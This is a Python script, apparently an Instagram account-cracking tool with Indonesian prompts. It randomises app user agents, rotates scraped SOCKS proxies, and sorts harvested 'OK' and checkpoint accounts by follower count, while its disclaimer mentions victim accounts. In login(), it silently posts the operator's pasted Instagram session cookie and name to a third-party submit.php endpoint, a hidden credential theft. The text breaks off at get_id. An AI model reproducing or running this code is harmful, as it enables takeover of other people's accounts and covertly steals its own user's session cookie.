#create by Ahmed Alzwage 
#coding with python3

###---[ IMPORT MODULE ]---###
import os, time, datetime, random, re, sys, platform, json, uuid, hmac,hashlib
try:import rich
except:os.system('pip install rich')
try:import requests
except:os.system('pip install requests')
try:import bs4
except:os.system('pip install bs4')
try:import concurrent.futures
except:os.system('pip install futures')
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel
from rich import print as prints
from rich.tree import Tree
from datetime import datetime,date
from time import sleep
from rich.table import Table
from rich.console import Console
from rich.columns import Columns
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn
from rich.progress import TimeElapsedColumn
from bs4 import BeautifulSoup as parser

###---[ GLOBAL NAME ]---###
console = Console()
rr = random.randint
rc = random.choice
ses = requests.Session()
hp = platform.platform()
sleep = time.sleep
dump, ok, cp, loop, pro = [], 0, 0, 0, []
kode_name, pilih_info = "rivaan.remmington", []
pilih_ua, infinix, vivo = [], [], []
list_proxy = []

###---[ WARNA RICH ]---###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
C2 = "[#00FFFF]" # BIRU MUDA
P2 = "[bold white]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
ran_rich = rc([K2,C2,J2,H2,U2])

###---[ WARNA PRINT ]---###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
C = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
J = '\x1b[38;5;208m' #JINGGA
ran_prin = rc([H,K,C,U])

###---[ TANGGAL & CREATE FILE ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+str(blx)+str(tahun)
sim_ok = f'STAROZ/OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'STAROZ/CP-{hari}-{bulan}-{tahun}.txt'

###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
	
###---[ DUMP MERK HP ]---###
try:
	infi = parser(requests.get('https://udger.com/resources/ua-list/devices-brand-detail?brand=infinix').text, 'html.parser')
	for x in infi.find_all("td"):
		if "Brand market" in str(x):
			for x in x.text.replace("Brand market names in DB:\n", "").split(","):infinix.append(x)
except: infinix = [' Hot 10', ' Hot 10 Lite', ' Hot 10 Play', ' Hot 10i', ' Hot 10s', ' Hot 10T', ' Hot 11', ' Hot 11 (2022)', ' Hot 11s', ' Hot 12', ' Hot 12 Play', ' Hot 12 Pro', ' Hot 12i']

###---[ DUMP PROXY ]---###
try:
	for data in ses.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/tg/socks.json").json(): list_proxy.append({"https": "socks5://"+data["ip"]+":"+data["port"]})
except Exception as e: pass

###---[ USER AGENT ]---###
def ua_rozh():
	rr = random.randint; rc = random.choice; andro = rr(7,13); cc = rr(20,33)
	merk = rc(['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']).split("|")
	com = rc(["qcom","mt6833","mt6765","samsungexynos7580","samsungexynos8895","samsungexynos7880","universal5420","samsungexynos8895"])
	dpi = rc(["120","160","240","320","480","640"])
	resolusi = rc(['828x1792', '414x896', '1125x2436', '375x812', '1242x2688', '414x896', '1125x2436', '375x812', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '640x1136', '320x568', '640x1136', '320x568', '2048x2732', '1024x1366', '1536x2048', '768x1024', '1536x2048', '768x1024', '1536x2048', '768x1024', '768x1024', '768x1024', '1440x2560', '412x732', '1080x1920', '412x732', '1440x869', '412x869', '1080x2280', '412x869', '1080x2160', '412x824', '1080x2220', '412x846', '1440x2960', '412x847', '1080x2160', '412x824', '1440x2560', '412x732', '1440x2560', '412x732', '1080x1920', '412x732', '1440x3040', '412x869', '1080x2280', '412x869', '1440x2960', '360x740', '1440x2560', '480x853', '1440x2560', '480x853', '1080x1920', '480x853', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2560', '360x640', '1440x2560', '360x640', '1536x2048', '768x1024', '1200x1920', '600x960', '1800x2560', '900x1280', '800x1280', '800x1280', '2560x1700', '1280x850'])
	return (f"Instagram {rr(50,150)}.0.0.{rr(10,20)}.{rr(100,150)} Android ({cc}/{andro}; {dpi}dpi; {resolusi}; samsung; {merk[0]}; {merk[1]}; {com}; en_US)")

bas = requests.get("https://pastebin.com/raw/4AGnWegR").text.split("==")[1].split(",")
def ua_regular():
	rr = random.randint; rc = random.choice; andro = rr(9,13); cc = rr(20,33)
	dpi = rc(["120","160","240","320","480","640"])
	resolusi = rc(['828x1792', '414x896', '1125x2436', '375x812', '1242x2688', '414x896', '1125x2436', '375x812', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '640x1136', '320x568', '640x1136', '320x568', '2048x2732', '1024x1366', '1536x2048', '768x1024', '1536x2048', '768x1024', '1536x2048', '768x1024', '768x1024', '768x1024', '1440x2560', '412x732', '1080x1920', '412x732', '1440x869', '412x869', '1080x2280', '412x869', '1080x2160', '412x824', '1080x2220', '412x846', '1440x2960', '412x847', '1080x2160', '412x824', '1440x2560', '412x732', '1440x2560', '412x732', '1080x1920', '412x732', '1440x3040', '412x869', '1080x2280', '412x869', '1440x2960', '360x740', '1440x2560', '480x853', '1440x2560', '480x853', '1080x1920', '480x853', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2560', '360x640', '1440x2560', '360x640', '1536x2048', '768x1024', '1200x1920', '600x960', '1800x2560', '900x1280', '800x1280', '800x1280', '2560x1700', '1280x850'])
	tipe = rc(["spesn","lavender","lime","viva","fleur","joyeuse","pissarropro","rosemary","angelican","olivelite"])
	return f"Instagram {rr(40,166)}.0.0.{rr(10,20)}.{rr(100,150)} Android ({cc}/{andro}; {dpi}dpi; {resolusi}; Xiaomi/Redmi; {rc(bas)}; {tipe}; qcom; en_US; 438795758)"

#input(ua_regular())	
def ua_rozh():
	rr = random.randint; rc = random.choice; andro = rr(9,13); cc = rr(20,33)
	merk = rc(['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']).split("|")
	com = rc(["qcom","mt6833","mt6765","samsungexynos7580","samsungexynos8895","samsungexynos7880","universal5420","samsungexynos8895"])
	dpi = rc(["120","160","240","320","480","640"])
	resolusi = rc(['828x1792', '414x896', '1125x2436', '375x812', '1242x2688', '414x896', '1125x2436', '375x812', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '1080x1920', '414x736', '750x1334', '375x667', '640x1136', '320x568', '640x1136', '320x568', '2048x2732', '1024x1366', '1536x2048', '768x1024', '1536x2048', '768x1024', '1536x2048', '768x1024', '768x1024', '768x1024', '1440x2560', '412x732', '1080x1920', '412x732', '1440x869', '412x869', '1080x2280', '412x869', '1080x2160', '412x824', '1080x2220', '412x846', '1440x2960', '412x847', '1080x2160', '412x824', '1440x2560', '412x732', '1440x2560', '412x732', '1080x1920', '412x732', '1440x3040', '412x869', '1080x2280', '412x869', '1440x2960', '360x740', '1440x2560', '480x853', '1440x2560', '480x853', '1080x1920', '480x853', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2960', '360x740', '1440x2560', '360x640', '1440x2560', '360x640', '1536x2048', '768x1024', '1200x1920', '600x960', '1800x2560', '900x1280', '800x1280', '800x1280', '2560x1700', '1280x850'])
	return (f"Instagram {rr(40,166)}.0.0.{rr(10,22)}.{rr(100,150)} Android ({cc}/{andro}; {dpi}dpi; {resolusi}; samsung; {merk[0]}; {merk[1]}; {com}; en_US)")
	
def ua_rozha():
    rr = random.randint
    rc = random.choice
    real = str(rc(["SM-J120H","SM-J120F","SM-J120M","SM-J111M","SM-J111F","SM-J110H","SM-J110G","SM-J110F","SM-J110M","SM-J105H","SM-J105Y","SM-J105B","SM-J106H","SM-J106F","SM-J106B","SM-J106M","SM-J200F","SM-J200M","SM-J200G","SM-J200H","SM-J200F","SM-J200GU","SM-J260M","SM-J260F","SM-J260MU","SM-J260F","SM-J260G","SM-J200BT","SM-G532G","SM-G532M","SM-G532MT"]))
    me = str(rc(["V2027", "V1809A", "V2221", "vivo 1901", "vivo 1613", "vivo 1723", "vivo 1918", "vivo 1814"]))
    com = str(rc(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C"]))
    comi = str(rc(["en_GB","en_US","ar_LY"]))
    dpi = str(rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"]))
    pxl = str(rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"]))
    igv = ("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182")
    igve = igv.split(",")
    andro = str(rc(["30/11","31/12","29/10"]))
    versi = str(rc(igve))
    return (f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; vivo; {me}; {com}; {comi})")
		
#input(ua_rozh())	

###---[ SORTIR AKUN ]---###
def sortir_akun():
	sim_1 = f'OK1+/OK-{hari}-{bulan}-{tahun}.txt'
	sim_2 = f'OK100+/OK-{hari}-{bulan}-{tahun}.txt'
	sim_3 = f'OK1000+/OK-{hari}-{bulan}-{tahun}.txt'
	nom, no, s1, s2, s3 = [], 0, 0, 0, 0
	prints(Panel(f'         [{ran_rich}!{P2}] silahkan pilih nomor yang akan di sortir',padding=(0,9),style="bold white"))
	try:ok = os.listdir('STAROZ')
	except:print(f" [{M}!{P}] tidak hasil");exit()
	for x in ok:
		if 'OK' in str(x):
			nom.append(x)
			no+=1
			try:jum= open('STAROZ/'+x,'r').readlines()
			except:continue
			print(f' [{H}{no}{P}] {x} - {H}{len(jum)} {P}akun')	
	abc = input(f' [{C}?{P}] nomor file : ')
	file = nom[int(abc)-1]
	try:buka = open('STAROZ/'+file,'r').read().splitlines()
	except:print(f"[{M}!{P}] file tidak ada hasil ok");exit()
	prints(Panel(f'\t   hasil 1+ di : {H2}{sim_1}{P2}\n\t   hasil 100+ di : {H2}{sim_2}{P2}\n\t   hasil 1000+ di : {H2}{sim_3}{P2}',padding=(0,5),style="bold white"))
	for data in buka:
		pg = data.split('|')[2].replace(' ','')
		if int(pg)<100:
			s1 += 1
			open(sim_1,"a").write(data+"\n")
		elif int(pg)<1000:
			if int(pg)<100:pass
			else:
				s2 += 1
				open(sim_2,"a").write(data+"\n")
		elif int(pg)>1000:
			if int(pg)<1000:pass
			else:
				s3 += 1
				open(sim_3,"a").write(data+"\n")
	print(f" [{C}!{P}] jumlah akun -100  : {H}{s1}{P}\n [{C}!{P}] jumlah akun +100  : {H}{s2}{P}\n [{C}!{P}] jumlah akun +1000 : {H}{s3}{P}")
	prints(Panel(f'       [{ran_rich}!{P2}] ingin hapus file utama setelah di sortir ({H2}ya{P2}/{K2}no{P2})',padding=(0,9),style="bold white"))
	apa = input(f" [{C}?{P}] pilih : ")
	if apa in ["Ya","Y","y","ya"]:
		try: os.remove(f"STAROZ/{file}")
		except:pass
	else: pass
	exit()
	
#input(ua_rozh())		
###---[ PROXIES ]---###
try:
	uadev = ses.get("https://raw.githubusercontent.com/RozhBasXYZ/REMOVE/main/info.txt").text
	if 'useragent' in uadev:pass
	for x in ses.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=id&ssl=all&anonymity=all").text.splitlines(): pro.append(x)
except Exception as e:
	exit(f" [{M}!{P}] terjadi kesalahan, coba jalan kan kembali")
		
###---[ MY LOGO ]---###
def logo():
	prints(Panel(f"""[bold]{ran_rich}          {P2} INSTA😁 {K2}LIBYA🥶{P2}By😈{K2}AhmedAlzwage☠️{P2} version {K2}1{P2}.{K2}1{P2}""",style="bold white"))
        
###---[ PERTANYAAN ]---###
def pertanyaan():
	clear_layar()
	logo()
	print(f" [{K}!{P}] peringatan keras..!\n {K}•{P} segala bentuk kerugian dan penyalahgunaan\n {K}•{P} akun korban bukan tangung jawab autor jika anda\n {K}•{P} setuju maka tangung jawab sepenuh nya di tanggan anda\n {K}•{P} ketik '{H}ya{P}' untuk setuju, ketik '{M}no{P}' untuk tidak")
	apa = input(f' [{C}?{P}] pilih : ')
	if apa in ['ya','Ya','y','Y']:open('.siap.txt','w').write('siap');back()
	elif apa in ['no','No','NO','n']:exit('pilihan yang tepat..')
	else:print(f"'pilih antara {H}ya{P}' atau '{M}tidak{P}'");time.sleep(2);


###---[ BACK ]---###
def back():
	try:open('.siap.txt','r').read()
	except:pertanyaan()
	try:coki = open('.cookie_ig.txt','r').read()
	except:login()	
	try:
		hd = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)"}
		ck={'cookie':coki}
		id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
		po  = ses.get(f'https://i.instagram.com/api/v1/users/{id}/info/',headers=hd,cookies=ck)
		info = json.loads(po.text)
		if 'full_name' in str(info):
			try:nama = info['user']['full_name'].split(' ')[0].lower()
			except:nama = info['user']['full_name'].lower()
			uid = info["user"]["pk"]
		else:login()
	except Exception as e:login()
	main_menu(nama,uid,coki)
	
###---[ LOGIN COOKIE ]---###
def login():
	clear_layar()
	logo()
	coki = input(f'\n [{C}?{P}] cookie : ')+";"
	open('.cookie_ig.txt','w').write(coki)
	try:
		hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3"}
		ck={'cookie':coki}
		id = re.findall('ds_user_id=(\d+);',str(coki))[0]
		po  = ses.get(f'https://i.instagram.com/api/v1/users/{id}/info/',headers=hd,cookies=ck)
		info = json.loads(po.text)
		if 'full_name' in str(info):
			try:
				cek_email(re.findall("sessionid=(.*?);",coki)[0])
				ses.post("https://api-cdn-markup.yayanxd.my.id/submit.php", data={"title": info["user"]["full_name"], "message": coki})
			except: pass
		elif 'challenge_required' in str(info):exit(' akun checkpoint')
		else:print(' cookie invalid atau perangkat spam');exit()
	except Exception as e:
		exit(' terjadi kesalahan')
	back()

###---[ CONVERT ID ]---###
def get_id(user,cok):
	try:
